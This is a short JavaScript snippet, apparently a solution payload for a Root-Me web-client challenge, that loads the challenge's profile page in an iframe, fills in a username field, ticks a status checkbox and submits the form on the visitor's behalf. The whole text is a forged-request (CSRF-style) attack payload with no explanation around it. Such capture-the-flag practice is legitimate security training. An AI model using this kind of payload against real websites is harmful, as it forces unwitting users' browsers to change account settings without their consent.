const ifr = document.querySelector("#principalIframe");
ifr.src = "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"
const insideIfr = ifr.contentDocument;

insideIfr.querySelector("#username").value = "test1"
insideIfr.querySelector("#status").checked = true

insideIfr.forms[0].submit()




